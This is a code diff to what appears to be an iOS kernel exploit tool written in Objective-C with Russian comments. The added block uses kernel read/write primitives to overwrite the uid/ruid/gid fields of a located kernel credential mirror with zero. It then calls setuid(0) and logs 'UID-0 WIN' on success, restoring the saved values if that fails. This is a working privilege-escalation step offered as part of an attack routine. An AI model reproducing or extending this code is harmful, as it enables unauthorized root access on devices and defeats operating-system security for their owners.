@@ -2644,7 +2644,6 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                 kpNote(r, [NSString stringWithFormat:@"  [W501] ★ HIT pa=%#llx va=%#llx off=+x%x",
                           (unsigned long long)pa, (unsigned long long)(al + o), o]);
                 if (!firstHitPA) { firstHitPA = pa; firstHitVA = al + o; firstHitOff = o; }
-                // дамп вокруг хита (только чтение)
                 uint32_t base = o >= 0x10 ? o - 0x10 : 0;
                 NSMutableString *ctx = [NSMutableString string];
                 for (uint32_t j = 0; j < 6 && base + j * 8 < 0x4000; j++)
@@ -2655,8 +2654,36 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         }
         kpNote(r, [NSString stringWithFormat:@"  [W501] frames type21=%u qwords_scanned=%llu hits=%u",
                   nType21, (unsigned long long)scanned, nHit]);
-        if (nHit == 0)
+        if (nHit == 0) {
             kpNote(r, @"  [W501] writable uid-зеркала НЕТ — кластер 501 только в RO (0x18)");
+        } else if (firstHitVA) {
+            // 2.0.64: пишем uid→0 в найденное зеркало, пробуем getuid/setuid
+            kpNote(r, [NSString stringWithFormat:@"  [W501] WRITE-TRY va=%#llx", (unsigned long long)firstHitVA]);
+            // сохраняем 3 кворда кластера (uid/ruid/gid-зона)
+            uint64_t s0 = early_kread64(firstHitVA);
+            uint64_t s1 = early_kread64(firstHitVA + 8);
+            uint64_t s2 = early_kread64(firstHitVA + 16);
+            kpNote(r, [NSString stringWithFormat:@"  [W501] save %016llx %016llx %016llx",
+                      (unsigned long long)s0, (unsigned long long)s1, (unsigned long long)s2]);
+            early_kwrite64(firstHitVA, 0);
+            early_kwrite64(firstHitVA + 8, 0);
+            early_kwrite64(firstHitVA + 16, 0);
+            uint64_t r0 = early_kread64(firstHitVA);
+            uid_t u1 = getuid(), e1 = geteuid();
+            int su = setuid(0);
+            uid_t u2 = getuid(), e2 = geteuid();
+            kpNote(r, [NSString stringWithFormat:@"  [W501] after write readback=%016llx setuid0=%d uid %u→%u euid %u→%u",
+                      (unsigned long long)r0, su, u1, u2, e1, e2]);
+            if (u2 == 0 || e2 == 0) {
+                kpNote(r, @"=== UID-0 WIN ★★★ ===");
+            } else {
+                // restore
+                early_kwrite64(firstHitVA, s0);
+                early_kwrite64(firstHitVA + 8, s1);
+                early_kwrite64(firstHitVA + 16, s2);
+                kpNote(r, @"  [W501] restored — getuid не увидел 0, зеркало не то что читает getuid");
+            }
+        }
     }
 
     [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501] выше\n"];
